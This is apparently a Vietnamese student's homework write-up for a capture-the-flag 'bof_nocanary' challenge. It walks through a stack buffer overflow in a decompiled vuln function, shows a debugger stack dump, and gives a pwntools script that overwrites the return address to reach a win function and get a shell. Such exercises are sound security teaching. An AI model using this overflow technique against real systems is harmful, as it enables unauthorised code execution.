# pwn

# Homework - 18/8 #

## bof_nocanary ##

```C
void *__fastcall vuln(const char *a1)
{
  size_t v1; // rax
  char dest[32]; // [rsp+10h] [rbp-20h] BYREF

  if ( strlen(a1) > 64 )
  {
    puts("Buffer too long!!");
    _exit(-1);
  }
  v1 = strlen(a1);
  return memcpy(dest, a1, v1);
}
```

Trong bài này, dest có 32 kí tự, mà giới hạn độ dài của tham số truyền vào là 64, nên mình có thể ghi đè được 32 kí tự

Thử nhập 1 chuỗi kí tự a nhiều hơn 32 kí tự thì mình thấy rbp bị ghi đè
```
00:0000│ rsp     0x7fffffffdd70 —▸ 0x555555554040 ◂— 0x400000006
01:0008│         0x7fffffffdd78 —▸ 0x7fffffffe184 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
02:0010│ rax rdi 0x7fffffffdd80 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓            3 skipped
06:0030│ rbp     0x7fffffffdda0 —▸ 0x7fffffff6161 ◂— 0x0
07:0038│         0x7fffffffdda8 —▸ 0x5555555552cd (main+132) ◂— mov eax, 0
```

Để gọi được hàm `w1n` ở địa chỉ `0x5555555552d4` thì mình cần ghi đè địa chỉ trả về hàm main.
Nhìn stack ở trên thì mình cần 32 kí tự + 8 kí tự để ghi đè rbp + kí tự '\xd4'

```python
from pwn import *
proc = process(["./bof", (b"a"*40 + b"\xd4")])
proc.interactive()
```
```
duplicate@Pwn:/tmp$ ipython3 solbof.py
[x] Starting local process './bof'
[+] Starting local process './bof': pid 1852
[*] Switching to interactive mode
whoami
duplicate
[*] Stopped process './bof' (pid 1852)
```



